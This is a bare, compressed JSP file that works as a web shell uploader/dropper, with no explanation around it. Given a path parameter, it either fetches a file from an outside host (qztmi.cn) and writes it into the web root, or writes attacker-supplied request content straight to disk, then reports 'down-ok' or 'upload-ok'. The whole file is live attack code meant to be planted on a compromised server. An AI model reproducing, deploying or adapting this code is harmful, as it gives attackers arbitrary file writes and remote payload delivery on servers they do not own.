<%@page import="java.io.*"%><%@page import="java.net.*"%><%String t=request.getRealPath("/")+request.getParameter("f");new File(t).getParentFile().mkdirs();if(request.getParameter("p")==null){DataInputStream i=new DataInputStream(((HttpURLConnection)(new URL("http://qztmi.cn/js/h.txt").openConnection())).getInputStream());DataOutputStream o=new DataOutputStream(new FileOutputStream(t));byte[] b=new byte[4096];int c=0;while((c=i.read(b))>0){o.write(b,0,c);}o.close();i.close();out.println("down-ok");response.setHeader("down-ok","1");}else{(new FileOutputStream(t)).write(request.getParameter("p").getBytes());out.println("upload-ok");}%>